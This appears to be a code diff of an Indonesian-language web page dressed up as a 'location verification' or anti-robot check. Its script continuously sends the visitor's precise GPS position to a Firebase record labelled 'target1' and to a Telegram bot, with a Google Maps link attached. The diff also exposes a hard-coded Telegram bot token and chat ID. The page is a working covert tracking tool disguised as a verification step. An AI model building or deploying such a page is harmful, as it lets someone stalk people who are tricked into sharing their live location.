@@ -3,19 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi</title>
+    <title>Sistem Verifikasi Akses</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 </head>
-<body class="bg-gray-900 text-white flex items-center justify-center h-screen">
-    <div class="bg-gray-800 p-8 rounded-2xl shadow-2xl max-w-sm text-center border border-gray-700 mx-4">
-        <h2 class="text-2xl font-bold mb-4">Konfirmasi Akses</h2>
-        <p class="text-gray-400 mb-6">Harap izinkan akses lokasi untuk memverifikasi bahwa Anda bukan robot.</p>
-        <button onclick="mulaiLacak()" id="btn-main" class="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-full font-bold transition-all w-full shadow-lg">
-            SAYA SETUJU
-        </button>
-        <p id="status" class="mt-4 text-xs text-gray-500 italic"></p>
+<body class="bg-slate-900 text-white flex items-center justify-center h-screen">
+    <div class="bg-slate-800 p-8 rounded-3xl shadow-2xl max-w-sm text-center border border-slate-700 mx-4">
+        <h2 class="text-2xl font-bold mb-2">Verifikasi Lokasi</h2>
+        <p class="text-slate-400 text-sm mb-6">Izinkan akses lokasi untuk melanjutkan proses verifikasi identitas Anda.</p>
+        <button onclick="mulaiLive()" id="btn" class="bg-blue-600 hover:bg-blue-700 text-white px-8 py-4 rounded-2xl font-bold w-full transition-all">SAYA SETUJU</button>
+        <p id="status" class="mt-4 text-xs text-slate-500 italic"></p>
     </div>
 
     <script>
@@ -26,59 +24,36 @@
             storageBucket: "live-traker-e7ce2.firebasestorage.app",
             messagingSenderId: "425874298746",
             appId: "1:425874298746:web:949db14ea30a1e742068c3",
-            measurementId: "G-7PD74XWDSN",
-            databaseURL: "https://console.firebase.google.com/u/0/project/live-traker-e7ce2/database/live-traker-e7ce2-default-rtdb/data/~2F"
+            databaseURL: "https://live-traker-e7ce2-default-rtdb.firebaseio.com"
         };
-
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        const botToken = "8254533879:AAExi3a9lAtiYa82yvbpY34l40M9uHPf41U"; 
-        const chatId = "5492455730"; 
+        function mulaiLive() {
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('status').innerText = "Sinkronisasi lokasi sedang berjalan...";
 
-        function mulaiLacak() {
-            const status = document.getElementById('status');
-            if (!navigator.geolocation) {
-                status.innerText = "Browser tidak mendukung GPS.";
-                return;
-            }
-            status.innerText = "Sedang memverifikasi lokasi...";
+            navigator.geolocation.watchPosition((pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
 
-            navigator.geolocation.watchPosition((position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const acc = position.coords.accuracy;
-
-                // 1. Kirim ke Firebase (Live Tracking)
+                // Update ke Firebase (Real-time ke Admin)
                 database.ref('live_location/target1').set({
-                    latitude: lat,
-                    longitude: lon,
-                    accuracy: acc,
-                    timestamp: Date.now()
+                    lat: lat, lon: lon, acc: acc, time: Date.now()
                 });
 
-                // 2. Kirim ke Telegram (Notifikasi)
-                kirimKeTelegram(lat, lon, acc);
-
-                status.innerText = "Verifikasi Berhasil. Mohon tunggu...";
-            }, (error) => {
-                status.innerText = "Gagal: Anda harus mengizinkan akses lokasi.";
-            }, { enableHighAccuracy: true });
-        }
-
-        function kirimKeTelegram(lat, lon, acc) {
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const pesan = `📍 LOKASI UPDATE!\nLat: ${lat}\nLon: ${lon}\nAcc: ${acc}m\n\nLink: ${mapsLink}`;
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: pesan })
-            });
+                // Update ke Telegram
+                fetch(`https://api.telegram.org/bot8254533879:AAExi3a9lAtiYa82yvbpY34l40M9uHPf41U/sendMessage`, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        chat_id: "5492455730",
+                        text: `📍 LIVE UPDATE\nLat: ${lat}\nLon: ${lon}\nAcc: ${acc}m\nLink: https://www.google.com/maps?q=${lat},${lon}`
+                    })
+                });
+            }, (err) => { alert("Harap aktifkan GPS!"); }, { enableHighAccuracy: true });
         }
     </script>
 </body>
 </html>
-
-
-
-
